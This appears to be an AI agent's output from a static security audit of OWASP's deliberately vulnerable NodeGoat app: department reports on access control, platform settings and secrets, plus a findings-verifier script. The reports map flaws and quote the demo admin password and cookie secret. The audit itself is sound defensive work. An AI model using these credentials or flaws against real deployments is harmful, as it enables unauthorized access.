"fix": "Terminate TLS (either in this process via https.createServer with a real certificate, or at a reverse proxy that the app trusts via X-Forwarded-Proto) and redirect all HTTP traffic to HTTPS; only then enable helmet.hsts().",
"title": "Session cookie is configured with no secure, sameSite or maxAge attributes",

"evidence": "The object passed to express-session has no `cookie` key at all; the fix that would add one (`cookie: { httpOnly: true /* secure: true */ }`) sits commented out at lines 92-100 right below the active call, confirming it was never applied. Without an explicit cookie.secure, express-session defaults secure to false, so the cookie is sent over the plain-HTTP listener from the previous finding; without sameSite set, no SameSite attribute is sent by this middleware; without maxAge the cookie never expires client-side.",

"impact": "The session cookie (which server.js:82 signs with the also-hard-coded cookieSecret) is sent over unencrypted HTTP and carries no SameSite restriction, making it interceptable on the network and usable in cross-site request contexts.",

"fix": "Set cookie: { secure: true, sameSite: 'lax', maxAge: <a bounded value> } in the session() options once the app is served over HTTPS, and set cookie.httpOnly explicitly rather than relying on the framework default.",
"title": "Global error handler renders the raw caught Error object straight into the HTML response",

"evidence": "app/routes/error.js (mounted last, at app/routes/index.js:82) catches every error passed to next(err), logs err.message and err.stack to the server console at lines 7-8, then calls res.render(\"error-template\", { error: err }) at lines 10-12, passing the entire Error object -- not a sanitized message -- to the view. The view (this file) interpolates it directly with {{error}} on line 11, and swig's autoescape is globally disabled (server.js:137), so whatever the error's string form contains reaches the client unescaped on every unhandled 500.",

"impact": "Any unhandled exception (a MongoDB driver error, a template error, a thrown validation error) returns its message text -- and potentially internal details such as query fragments or file paths -- directly in the HTML body to the requesting client, and unescaped HTML/script in that text would also render.",

"fix": "In app/routes/error.js, render a generic message and a correlation id (e.g. res.render(\"error-template\", { error: \"Something went wrong. Reference: \" + requestId })) and keep the full err.stack only in the server-side log.",
"title": "POST /login has no rate limiting or lockout, permitting unlimited password guesses",

"evidence": "I read the full middleware stack in server.js (favicon, bodyParser, session, static -- no limiter) and app/routes/index.js end to end: the only middleware in front of handleLoginRequest is none at all (no isLoggedIn check applies to /login, as expected). handleLoginRequest itself (app/routes/session.js:53-119) calls userDAO.validateLogin with no attempt counter, delay, CAPTCHA, or account lockout, and package.json has no rate-limiting dependency (express-rate-limit or similar) anywhere in the tree -- confirmed by grep across the whole repository returning no matches for a limiter.",

"impact": "An attacker can submit unlimited login attempts per second against any known username, making online password brute-forcing and credential-stuffing practical with no server-side friction.",

"fix": "Add a rate limiter (e.g. express-rate-limit) keyed by username and/or IP in front of POST /login and POST /signup, and add a short lockout or exponential backoff after repeated failures for the same account.",
"title": "NODE_ENV defaults to \"development\" and injects a live-reload debug script into every rendered page unless explicitly overridden",

"evidence": "When NODE_ENV is unset (the docker-compose.yml web service passes through an empty NODE_ENV: at line 7 with no value), config.js loads config/env/development.js, whose environmentalScripts array (development.js:9-13) contains a raw <script> tag that fetches http://<host>:35729/livereload.js built from location.host. I traced environmentalScripts into app/views/layout.html:125-127, where it is looped over and each entry is emitted with {{script}} -- unescaped, since swig autoescape is disabled globally (server.js:137) -- on every page that extends layout.html (login, signup, dashboard, etc., confirmed via grep showing the variable threaded through session.js, profile.js, contributions.js, memos.js, allocations.js, research.js, benefits.js and tutorial.js).",

"impact": "A production deployment that forgets to set NODE_ENV=production silently ships a development-only script tag pulling an external <script src> into every authenticated page, which is unnecessary code execution surface and reveals that the deployment is misconfigured.",

"fix": "Fail closed instead of defaulting to \"development\": require NODE_ENV to be set explicitly (throw if it is undefined) or default to \"production\", and keep environmentalScripts empty outside of local development.",

1: # Access review — NodeGoat
2: 
3: Department: authentication, session handling and authorization.
4: 
5: ## Scope and method
6: 
7: Target: `/home/user/targets/NodeGoat`, 111 files locked by `target.json` (sha256 `78ac112b7bd5083bb065086c4642dcd8a3932a8d3052f9405503124c90a70fe3`). This review is a manual read by a language model of the Express application's entry points, grounded by this examiner (`verify-safety-report.mjs`), which re-hashes the target and checks every finding's `file`/`line`/`snippet` against the tree as it stands. No dynamic scanner or semgrep run backs these findings; every one was read end to end.
8: 
9: Method: built the full route table from `server.js` (middleware order) and `app/routes/index.js` (every `app.get`/`app.post`/`app.use` registration), then for each route read the exact middleware chain in front of it and traced every request parameter, body field and session field the handler uses through to its data-access-object sink. Files read in full: `server.js`, `app/routes/index.js`, `app/routes/session.js`, `app/routes/profile.js`, `app/routes/allocations.js`, `app/routes/benefits.js`, `app/routes/contributions.js`, `app/routes/memos.js`, `app/routes/research.js`, `app/routes/tutorial.js`, `app/data/user-dao.js`, `app/data/allocations-dao.js`, `app/data/benefits-dao.js`, `app/views/benefits.html`, `config/config.js`. `package.json` was checked for rate-limiting and CSRF dependencies.
10: 
11: ## Route table (built from `app/routes/index.js`)
12: 
13: | Method | Path | Middleware chain | Handler |
14: | --- | --- | --- | --- |
15: | GET | `/` | — | `displayWelcomePage` |
16: | GET | `/login` | — | `displayLoginPage` |
17: | POST | `/login` | — | `handleLoginRequest` |
18: | GET | `/signup` | — | `displaySignupPage` |
19: | POST | `/signup` | — | `handleSignup` |
20: | GET | `/logout` | — | `displayLogoutPage` |
21: | GET | `/dashboard` | `isLoggedIn` | `displayWelcomePage` |
22: | GET | `/profile` | `isLoggedIn` | `displayProfile` |
23: | POST | `/profile` | `isLoggedIn` | `handleProfileUpdate` |
24: | GET | `/contributions` | `isLoggedIn` | `displayContributions` |
25: | POST | `/contributions` | `isLoggedIn` | `handleContributionsUpdate` |
26: | GET | `/benefits` | `isLoggedIn` | `displayBenefits` |
27: | POST | `/benefits` | `isLoggedIn` | `updateBenefits` |
28: | GET | `/allocations/:userId` | `isLoggedIn` | `displayAllocations` |
29: | GET | `/memos` | `isLoggedIn` | `displayMemos` |
30: | POST | `/memos` | `isLoggedIn` | `addMemos` |
31: | GET | `/learn` | `isLoggedIn` | inline redirect handler |
32: | GET | `/research` | `isLoggedIn` | `displayResearch` |
33: | `/tutorial/*` (12 pages) | — | tutorial router, no `isLoggedIn` |
34: 
35: An `isAdmin` middleware (`sessionHandler.isAdminUserMiddleware`, aliased at `app/routes/index.js:27`) exists and correctly checks `user.isAdmin` from the database, but grep across `app/routes/index.js` shows it is applied to **no live route** — its only two uses are in a commented-out "Fix for A7" block (lines 57-60) that would have added it to `/benefits`.
36: 
37: For an unauthenticated caller: every route above except the first six (`/`, `/login`, `/signup`, `/logout`) redirects to `/login` via `isLoggedIn`'s `req.session.userId` check, so unauthenticated access is correctly blocked everywhere it is checked. For an authenticated caller of the wrong identity: `isLoggedIn` only proves *a* session exists, never that the caller owns the resource or holds the right role — this is exactly where the findings below sit.
38: 
39: ## Findings summary
40: 
41: - critical: 0
42: - high: 3
43: - medium: 3
44: - low: 1
45: 
46: 1. **high** `access-idor-allocations` — `/allocations/:userId` takes the id from the URL, not the session (`app/routes/index.js:63`).
47: 2. **medium** `access-benefits-get-no-admin-check` — `/benefits` GET is missing the `isAdmin` check that is defined but never wired up (`app/routes/index.js:55`).
48: 3. **high** `access-benefits-post-no-admin-check` — `/benefits` POST lets any logged-in user rewrite any other user's benefit start date (`app/routes/index.js:56`).
49: 4. **medium** `access-login-no-session-regenerate` — login sets `req.session.userId` without regenerating the session id, unlike signup which does (`app/routes/session.js:116`).
50: 5. **low** `access-timing-unsafe-password-compare` — password check is `fromDB === fromUser`, not constant-time (`app/data/user-dao.js:61`).
51: 6. **high** `access-login-no-rate-limit` — no attempt limiting anywhere in front of `/login`, combined with a password policy that allows 1-character passwords (`app/routes/index.js:34`).
52: 7. **medium** `access-profile-no-csrf` — `csurf` is a dependency and is imported in `server.js` but `app.use(csrf())` is commented out, so no route in the app carries CSRF protection; cited on the sensitive `/profile` POST (`app/routes/index.js:48`).
53: 
54: Full detail, evidence and fixes for each are in `findings/access.json`.
55: 
56: ## What was not covered
57: 
58: - **Injection, XSS, SSRF, ReDoS**: `app/routes/contributions.js` (`eval()` on user input), `app/routes/research.js` (SSRF via `needle.get(req.query.url + ...)`), and NoSQL injection in `app/data/allocations-dao.js`'s `$where` clause were all seen while tracing routes for authorization but are injection-department findings, not authorization ones, and are not filed here.
59: - **Cookie flags and transport**: `server.js:78-102` configures `express-session` with the `cookie` block (including `httpOnly`) entirely commented out, and the app listens on plain HTTP (`http.createServer`, `server.js:145`) with HTTPS commented out. 1: # Platform review — NodeGoat
2: 
3: ## Scope and method
4: 
5: This is a review by a language model, grounded by manual line-by-line reading of the target and by the `verify-safety-report.mjs` examiner, which mechanically re-checks that every finding below resolves to a real file and line in the locked target tree (`target.json`, sha256 `78ac112b7bd5083bb065086c4642dcd8a3932a8d3052f9405503124c90a70fe3`, 111 files under `/home/user/targets/NodeGoat`). No automated scanner was available in this session (`semgrep` was not on `PATH`); every finding below comes from reading the source directly, not from a pattern match.
6: 
7: I read the server entry point (`server.js`) end to end first, since it is the whole middleware order and therefore the security policy, then followed each piece it wires in: `config/config.js` and every file under `config/env/`, `app/routes/index.js` (the route table) and every handler it mounts (`session.js`, `error.js`, `profile.js`, `contributions.js`, `benefits.js`, `allocations.js`, `memos.js`, `research.js`, `tutorial.js`), the view layer that the session/error handlers render into (`app/views/layout.html`, `app/views/error-template.html`, `app/views/login.html`, `app/views/signup.html`), and the deployment files (`Dockerfile`, `docker-compose.yml`, `package.json`, `nodemon.json`). I grepped the whole tree for CORS middleware, a rate-limiting dependency, `postMessage`, and `X-Powered-By`/debug settings to confirm absence rather than assuming it from a partial read.
8: 
9: NodeGoat is OWASP's own deliberately-vulnerable training application: nearly every fix is written in the source as a commented-out block with a `// Fix for A<n>` label, which made it possible to confirm both what runs today and what the maintainers themselves identified as the fix.
10: 
11: ## Findings
12: 
13: ### High
14: 
15: - `platform-no-tls-http-only` — Server only ever listens on plain HTTP; the HTTPS listener is fully commented out (`server.js:145`, CWE-319, confirmed) — the app is reachable only via `http.createServer`; the `https.createServer` block that would terminate TLS is commented out (lines 149-155). Combined with the next finding, the session cookie and login credentials travel in cleartext. Fix: terminate TLS in front of or inside the process and redirect HTTP to HTTPS.
16: - `platform-session-cookie-no-secure-samesite` — Session cookie is configured with no secure, sameSite or maxAge attributes (`server.js:78-85`, CWE-614, confirmed) — the `session()` call passes no `cookie` option at all; the commented-out fix directly below it (lines 92-100) shows a `cookie: { httpOnly: true /* secure: true */ }` object that was never applied. Fix: set `cookie: { secure: true, sameSite: 'lax', maxAge: <bounded> }` once TLS is in place.
17: - `platform-login-no-rate-limit` — `POST /login` has no rate limiting or lockout, permitting unlimited password guesses (`app/routes/index.js:34`, CWE-307, confirmed) — no limiter middleware exists anywhere in the codebase (confirmed by grep) and `handleLoginRequest` (`app/routes/session.js:53-119`) has no attempt counter or backoff. Fix: add a per-account/per-IP rate limiter and a short lockout after repeated failures.
18: 
19: ### Medium
20: 
21: - `platform-missing-security-headers` — Helmet hardening (CSP, frame options, MIME-sniffing protection, `X-Powered-By`) is imported but never mounted (`server.js:10`, CWE-693, confirmed) — the entire `helmet`/`nosniff` block (lines 38-65) is wrapped in a comment; the live middleware stack (lines 67-132) mounts none of it. Fix: uncomment and configure `helmet()` with an explicit CSP allow-list, and call `app.disable("x-powered-by")` before any route.
22: - `platform-error-handler-leaks-error-object` — Global error handler renders the raw caught `Error` object straight into the HTML response (`app/views/error-template.html:11`, CWE-209, confirmed) — `app/routes/error.js:10-12` passes the whole `err` object (not a sanitized message) to the view, and `{{error}}` interpolates it unescaped (swig autoescape is globally off, `server.js:137`) on every unhandled 500. Fix: render a generic message and a correlation id; keep the full stack only in the server-side log.
23: - `platform-default-dev-env-debug-script` — `NODE_ENV` defaults to `"development"` and injects a live-reload debug script into every rendered page unless explicitly overridden (`config/config.js:5`, CWE-489, confirmed) — `config/env/development.js`'s `environmentalScripts` (a raw `<script src="http://...:35729/livereload.js">` tag) is looped over unescaped in `app/views/layout.html:125-127` and reaches login, signup, dashboard and every other page that extends the shared layout. `docker-compose.yml:7` passes `NODE_ENV:` through with no value, so a deploy that forgets to set it falls straight into this default. Fix: fail closed (require `NODE_ENV` to be set, or default to `"production"`) instead of defaulting to development.
24: 
25: ## What was not covered
26: 
27: - **Authentication, session-fixation, IDOR/authorization and CSRF specifics** were left to the `access` department; this review only covers the session *cookie's* transport-level configuration (flags, TLS), not who is allowed to reach which route.
28: - **Hard-coded secrets** (`cookieSecret`, `cryptoKey`, the seeded admin password, the private key under `artifacts/`) were left to the `secrets` department; this review references `cookieSecret` only as the value the session middleware is keyed with, not as a secrets-exposure finding in its own right.
29: - **Injection sinks** (the NoSQL `$where` clauses, `eval()` on `contributions.js`, the open redirect on `/learn`, stored/reflected XSS in memos/profile) were left to the `injection` department.
30: - **CORS** was checked (grepped the whole tree for `cors`, `Access-Control-Allow-*`) and no CORS middleware or headers exist anywhere in the app; since NodeGoat is same-origin only with no API consumed cross-origin, there is nothing to report here, but this also means a future cross-origin API added to this codebase would start from zero CORS policy, not a permissive one — worth re-checking if that changes.
31: - **File uploads**: NodeGoat has no upload endpoint in this tree, so CWE-434 does not apply and was not investigated further.
32: - **Source maps**: no build step producing `.map` files was found (no webpack/bundler config in the reviewed tree); not applicable to this server-rendered swig app.
33: - **Docker/compose hardening beyond what is read**: `Dockerfile` does set a non-root `USER node` (line 17) so that specific check passed; base-image pinning (`node:12-alpine`, an EOL Node major) and dependency versions were left to the `dependencies` department.
34: - **Runtime behavior**: nothing here was verified against a running instance (no server was started); all findings are static-read conclusions about what the code as committed would do, not observed HTTP responses.
35: 
36: ## Certificate of mechanical checks
37: 
38: Verified findings: 6 (see `findings/platform.json`), each confirmed by `node verify-safety-report.mjs --findings findings/platform.json` against the locked target tree (sha256 `78ac112b7bd5083bb065086c4642dcd8a3932a8d3052f9405503124c90a70fe3`). This review does not certify the absence of vulnerabilities; it certifies only that each listed finding was mechanically verified to exist at the cited line, over the files listed in "Scope and method".

(End of file - total 38 lines)
</content>

2: 
3: ## What was reviewed
4: 
5: Target: `/home/user/targets/NodeGoat` (111 files locked by `target.json`, sha256 `78ac112b7bd5083bb065086c4642dcd8a3932a8d3052f9405503124c90a70fe3`). 6: 
7: Method: grep for assignment names containing `password`, `passwd`, `secret`, `token`, `key`, `credential`, `auth` or `connection`; for base64/hex blobs and `BEGIN ... PRIVATE KEY` markers; for `mongodb://` / connection-string authorities; and for `.env`, `.npmrc`, `.netrc`, CI (`.github/workflows/*.yml`, `.travis.yml`), and deployment files (`Dockerfile`, `docker-compose.yml`, `app.json`, `Procfile`). Every grep hit was opened and read in full context — the consuming code, not just the assignment — before being reported or discarded, per this program's evidence rule. NodeGoat ships no `.env`, `.npmrc` or `.netrc` file, so those specific patterns produced no findings.
8: 
9: ## Findings
10: 
11: Five findings, all in `findings/secrets.json`:
12: 
13: 1. **`secrets-cookie-secret`** (high, confirmed) — `config/env/all.js:8`. The Express session-signing secret is the literal `"session_cookie_secret_key_here"`. `config/env/production.js` is an empty object, so nothing overrides it in production; `server.js:82` passes it straight to `express-session`. This is a **live** value the running service uses unconditionally.
14: 
15: 2. **`secrets-db-reset-admin-password`** (critical, confirmed) — `artifacts/db-reset.js:18`. The admin account's password is seeded as the plaintext literal `"Admin_123"`, and `app/data/user-dao.js` compares login passwords with `fromDB === fromUser` (bcrypt is present as a dependency but the hashing/compare calls are commented out). `docker-compose.yml` and `app.json`'s Heroku `postdeploy` hook both run this exact script against the real database on every deploy. This is the highest-impact finding: a **live, working default admin credential**.
16: 
17: 3. **`secrets-committed-rsa-private-key`** (medium, confirmed) — `artifacts/cert/server.key:1-15`. A full PEM RSA private key is committed to the repo. `server.js` does read this exact file into `https.createServer`'s options, but I confirmed that whole block is currently commented out (the app starts a plain `http` server instead), so the key is dead code today rather than an active exposure — the app's own tutorial page (`a6.html`) shows the identical block as the intended "fix" to uncomment.
18: 
19: 4. **`secrets-crypto-key-dead-code`** (info, confirmed) — `config/env/all.js:9`. An AES/PBKDF2 key literal is defined, but I read `app/data/profile-dao.js` in full and confirmed the only code that would use it (encrypt/decrypt of SSN and DOB) is entirely commented out; the DAO stores ssn/dob in plaintext instead. Reported at info severity because it is not a working default for any reachable code path today, but it is already public and would become live the moment that commented block is restored.
20: 
21: 5. **`secrets-zap-api-key`** (low, confirmed) — `config/env/development.js:6` (identical in `test.js:6`). An OWASP ZAP proxy API key used only by the local DAST regression test (`test/security/profile-test.js`) against a private/lab IP (`192.168.56.20`); it never reaches the production config path and grants no access to the application or its data.
22: 
23: ## What was not reached / lower-confidence leads not reported as findings
24: 
25: - **Test-fixture duplicates of the admin/user passwords.** `test/e2e/fixtures/users/{admin,user}.json` and `test/security/profile-test.js:37` repeat the same `Admin_123` / `User1_123` values already covered by `secrets-db-reset-admin-password`. I did not file them as separate findings — they are the test suite deliberately exercising the same seeded, documented (README.md:22-23) demo credentials, not an independent leak, and filing them again would inflate the count without adding new information.
26: - **`artifacts/cert/server.crt`** — the certificate paired with `server.key` is public by design (it is a certificate, not a secret) and was read only to confirm the pairing; it is not itself a finding.
27: - **Dependency/lockfile contents** (`package-lock.json`) were not scanned for embedded registry auth tokens beyond a text read; no `_auth`, `_authToken` or registry-credential fields were present in what I read, but I did not run `npm audit` or a dedicated lockfile-secret scanner.
28: - **Git history** was not scanned (`git log -p`, gitleaks/trufflehog over all blobs). Everything above is scoped to the working tree as locked in `target.json`; if any of these secrets were rotated at some point, an older value could still exist in history and this review does not confirm its absence.
29: - **Client-side/browser bundle inspection** — NodeGoat serves server-rendered Swig templates (`app/views/**/*.html`) rather than a bundled JS client, and the JS served under `app/assets/` is vendor libraries (jQuery, Bootstrap, Chart) with no application secrets in them; I did not find a build step or bundler config to check for source-map or webpack-define leakage because none exists in this project.
30: - **`semgrep`** was not run in this session (not confirmed on PATH); all findings above come from direct reading, not tool output.
31: 
32: ## Severity note
33: 
34: The department's severity choices reflect the rubric's "worst realistic case the code as read supports": the admin password is rated critical because it is remote, unauthenticated, immediately grants full administrative access on any un-hardened deployment, and is corroborated by the app's own README as the intended default; the cookie secret is rated high rather than critical because exploiting it requires combining it with a session-fixation setup rather than a single-step takeover; the committed private key and the crypto key are both real hard-coded secrets but are currently unreachable through any live code path, which is why they are rated medium and info rather than high.

(End of file - total 34 lines)

1: #!/usr/bin/env node
2: // Mechanical examiner of a code-safety report. It is in the report
3: // repository's base commit, so no department can change what measures it.
4: //
5: //   node verify-safety-report.mjs --findings <path>  one department's findings
6: //   node verify-safety-report.mjs --findings <path> --list-invalid
7: //   node verify-safety-report.mjs --report           the merged report
8: //
9: // `--findings` decides one findings file against the target tree. Adding
10: // `--list-invalid` turns the same decision into a report: the failing ids go to
11: // stdout, one per line, and the exit code is 0, which is how the integration
12: // learns which findings to drop and disclose.
13: //
14: // `--report` decides SAFETY-REPORT.md and findings.json together, including the
15: // disclosure rule: every id any `findings/<department>.json` carries and
16: // findings.json does not must be named under `## What was not covered`.
17: //
18: // Exit 0 only when every rule holds; otherwise every failure is printed to
19: // stderr, one per line, and the exit code is 1. Node built-ins only, because
20: // this runs in a worktree that installs nothing.
21: import { createHash } from 'node:crypto'
22: import { existsSync, readdirSync, readFileSync } from 'node:fs'
23: import { basename, join, relative, resolve } from 'node:path'
24: 
25: /** Severities a finding may claim, most severe first. */
26: const SEVERITIES = ['critical', 'high', 'medium', 'low', 'info']
27: 
28: /** How sure a finding's author is that the cited code is exploitable as described. */
29: const CONFIDENCES = ['confirmed', 'likely', 'possible']
30: 
31: /** Sections SAFETY-REPORT.md carries, in this order. */
32: const SECTIONS = [
33:   '## Résumé exécutif',
34:   '## Executive summary',
35:   '## Scope and method',
36:   '## Findings',
37:   '## What was not covered',
38:   '## Certificate',
39: ]
40: 
41: /** The claim the certificate must make verbatim, and the only claim this review supports. */
42: const HONESTY = 'This review does not certify the absence of vulnerabilities; it certifies only that each listed finding was mechanically verified to exist at the cited line, over the files listed in "Scope and method".'
43: 
44: /** Claims no coverage this review can state would support. */
45: const OVERCLAIMS = /\bno vulnerabilities\b|\bfree of vulnerabilities\b|\b(?:is|are|was|were) secure\b|\bsafe to deploy\b|\bproven secure\b|\bfully audited\b/i
46: 
47: /** Text a report still carrying its template is refused for. */
48: const PLACEHOLDER = /\bTODO\b|\bTBD\b|\bFIXME\b|lorem ipsum|<placeholder>|PLACEHOLDER/i
49: 
50: /** String fields every finding states in prose. */
51: const PROSE_FIELDS = ['title', 'evidence', 'impact', 'fix']
52: 
53: /** How a file's text is compared with a finding's quoted snippet. */
54: const normalize = (text) => text.replace(/\s+/g, ' ').trim()
55: 
56: /** Lowercase hex SHA-256 of one buffer or string. */
57: const sha256 = (content) => createHash('sha256').update(content).digest('hex')
58: 
59: /**
60:  * Every file under one directory, relative and sorted, skipping the excluded names.
61:  * @param {string} root directory to walk
62:  * @param {string[]} exclude directory basenames never descended into
63:  * @returns {string[]} relative POSIX-ish paths, sorted
64:  */
65: function walk(root, exclude) {
66:   const found = []
67:   const descend = (directory) => {
68:     for (const entry of readdirSync(directory, { withFileTypes: true }).sort((a, b) => a.name.localeCompare(b.name))) {
69:       const path = join(directory, entry.name)
70:       if (entry.isDirectory()) {
71:         if (!exclude.includes(entry.name)) descend(path)
72:       } else if (entry.isFile()) found.push(relative(root, path))
73:     }
74:   }
75:   descend(root)
76:   return found.sort()
77: }
78: 
79: /** One target tree as the lock and the verifier both read it: the files, their digests, and their text. */
80: class Target {
81:   /**
82:    * @param {string} reportRoot the report repository the lock is committed in
83:    * @param {string[]} failures collector every rule appends to
84:    */
85:   constructor(reportRoot, failures) {
86:     this.failures = failures
87:     this.root = undefined
88:     this.files = new Map()
89:     this.lines = new Map()
90:     const lockPath = join(reportRoot, 'target.json')
91:     if (!existsSync(lockPath)) {
92:       failures.push('target.json is missing from this worktree; the base commit carries the lock of the tree under review')
93:       return
94:     }
95:     const lock = JSON.parse(readFileSync(lockPath, 'utf8'))
96:     this.root = lock.root
97:     this.exclude = lock.exclude ?? []
98:     this.digest = lock.sha256
99:     for (const [path, hash] of Object.entries(lock.files)) this.files.set(path, hash)
100:     this.checkTree()
101:   }
102: 
103:   /**
104:    * Refuse a target that changed since the base commit locked it: a finding
105:    * cites a line of the tree this program was asked to review, and a tree a
106:    * department edited is no longer that tree.
107:    */
108:   checkTree() {
109:     if (!existsSync(this.root)) {
110:       this.failures.push(`the target tree ${this.root} is not on this host, so no citation can be resolved`)
111:       this.root = undefined
112:       return
113:     }
114:     const present = walk(this.root, this.exclude)
115:     for (const path of present) {
116:       if (!this.files.has(path)) this.failures.push(`the target tree gained ${path} since the base commit locked it`)
117:     }
118:     for (const [path, hash] of this.files) {
119:       if (!present.includes(path)) {
120:         this.failures.push(`the target tree lost ${path} since the base commit locked it`)
121:         continue
122:       }
123:       if (sha256(readFileSync(join(this.root, path))) !== hash) {
124:         this.failures.push(`the target tree's ${path} changed since the base commit locked it; the target is read-only for this program`)
125:       }
126:     }
127:   }
128: 
129:   /**
130:    * The lines of one target file.
131:    * @param {string} path path relative to the target root
132:    * @returns {string[] | undefined} the file's lines, or undefined when it is not in the locked tree
133:    */
134:   linesOf(path) {
135:     if (this.root === undefined || !this.files.has(path)) return undefined
136:     if (!this.lines.has(path)) this.lines.set(path, readFileSync(join(this.root, path), 'utf8').split('\n'))
137:     return this.lines.get(path)
138:   }
139: 
140:   /**
141:    * Whether one `file:line` citation resolves in the locked tree.
142:    * @param {string} path path relative to the target root
143:    * @param {number} line 1-based line number
144:    * @returns {boolean} whether the file is under review and holds that line
145:    */
146:   resolves(path, line) {
147:     const lines = this.linesOf(path)
148:     return lines !== undefined && Number.isInteger(line) && line >= 1 && line <= lines.length
149:   }

152: /**
153:  * Decide one finding against the target tree.
154:  * @param {unknown} finding one entry of a findings file
155:  * @param {number} index its position, named when the entry has no usable id
156:  * @param {Target} target the locked tree the finding cites

158:  * @returns {string[]} every rule this finding broke, empty when it holds

160: function checkFinding(finding, index, target, seen) {
161:   const failures = []
162:   if (finding === null || typeof finding !== 'object' || Array.isArray(finding)) {
163:     return [`finding #${index + 1} is not a JSON object`]

166:   const name = typeof id === 'string' && id !== '' ? id : `#${index + 1}`

168:   // Letters, digits, `-`, `_` and `.`: wide enough for both the `SEC-001`
169:   // numbering the knowledge pack's schema uses and a department-prefixed name.
170:   if (typeof id !== 'string' || !/^[A-Za-z0-9][\w.-]*$/.test(id)) fail('id must be letters, digits, dots, dashes or underscores')

172:   else seen.add(id)
173:   if (typeof finding.cwe !== 'string' || !/^CWE-\d+$/.test(finding.cwe)) fail('cwe must match CWE-<number>')

176:   if (!CONFIDENCES.includes(finding.confidence)) fail(`confidence must be one of ${CONFIDENCES.join(', ')}`)

178:     if (typeof finding[field] !== 'string' || finding[field].trim() === '') fail(`${field} must be a non-empty string`)
179:   }
180:   if (!Array.isArray(finding.references) || finding.references.some(reference => typeof reference !== 'string')) {
181:     fail('references must be an array of strings')
182:   }
183:   const { file, line, endLine, snippet } = finding
184:   if (typeof file !== 'string' || file === '' || file.startsWith('/') || file.split('/').includes('..')) {
185:     fail('file must be a path relative to the target root')
186:     return failures
187:   }
188:   const lines = target.linesOf(file)
189:   if (lines === undefined) {
190:     fail(`file ${file} is not in the tree under review`)
191:     return failures
192:   }
193:   if (!Number.isInteger(line) || line < 1 || line > lines.length) {
194:     fail(`line ${JSON.stringify(line)} is outside ${file}, which has ${lines.length} lines`)
195:     return failures
196:   }
197:   const last = endLine === undefined ? line : endLine
198:   if (!Number.isInteger(last) || last < line || last > lines.length) {
199:     fail(`endLine ${JSON.stringify(endLine)} is outside ${file}, which has ${lines.length} lines`)
200:     return failures
201:   }
202:   if (typeof snippet !== 'string' || snippet.trim() === '') {
203:     fail('snippet must quote the cited line')
204:     return failures
205:   }
206:   const quoted = normalize(lines.slice(line - 1, last).join('\n'))
207:   if (normalize(snippet) !== quoted) {
208:     fail(`snippet does not match ${file}:${line}, which reads ${JSON.stringify(quoted.slice(0, 160))}`)

210:   return failures

213: /**
214:  * Read one findings file.
215:  * @param {string} path the file to read
216:  * @param {string[]} failures collector a malformed file is reported on
217:  * @returns {unknown[]} the entries, empty when the file is missing or malformed
218:  */
219: function readFindings(path, failures) {
220:   if (!existsSync(path)) {
221:     failures.push(`${path} is missing`)
222:     return []
223:   }
224:   let parsed
225:   try {
226:     parsed = JSON.parse(readFileSync(path, 'utf8'))
227:   } catch (error) {
228:     failures.push(`${path} is not JSON: ${error.message}`)
229:     return []
230:   }
231:   if (!Array.isArray(parsed)) {
232:     failures.push(`${path} must be a JSON array of findings`)
233:     return []
234:   }
235:   return parsed
236: }

238: /**
239:  * Decide one findings file on its own.
240:  * @param {string} path the findings file
241:  * @param {Target} target the locked tree it cites
242:  * @returns {{ failures: string[], invalid: string[], findings: unknown[] }} the broken rules, the ids that broke them, and the entries
243:  */
244: function checkFindingsFile(path, target) {
245:   const failures = []
246:   const findings = readFindings(path, failures)
247:   const invalid = []
248:   const seen = new Set()
249:   findings.forEach((finding, index) => {
250:     const broken = checkFinding(finding, index, target, seen)
251:     if (broken.length === 0) return

253:     invalid.push(typeof finding?.id === 'string' ? finding.id : `#${index + 1}`)
254:   })
255:   return { failures, invalid, findings }
256: }

258: /**

261:  * @param {string} heading the section heading, including its `##`
262:  * @returns {string} the text between this heading and the next one, empty when absent
263:  */
264: function section(text, heading) {
265:   const start = text.indexOf(`${heading}\n`)
266:   if (start === -1) return ''
267:   const body = text.slice(start + heading.length + 1)
268:   const next = body.search(/^## /m)
269:   return next === -1 ? body : body.slice(0, next)
270: }

276:  * @returns {string[]} every rule the report broke
277:  */

279:   const reportPath = join(root, 'SAFETY-REPORT.md')
280:   if (!existsSync(reportPath)) {
281:     return [`SAFETY-REPORT.md is missing; REPORTING.md in this worktree states the sections it carries: ${SECTIONS.join(', ')}`]
282:   }
283:   const text = readFileSync(reportPath, 'utf8')
284:   const failures = []
285:   let previous = -1
286:   for (const heading of SECTIONS) {
287:     const at = text.indexOf(`${heading}\n`)
288:     if (at === -1) failures.push(`SAFETY-REPORT.md has no section ${JSON.stringify(heading)}`)
289:     else if (at < previous) failures.push(`SAFETY-REPORT.md has ${JSON.stringify(heading)} out of order; the order is ${SECTIONS.join(' then ')}`)
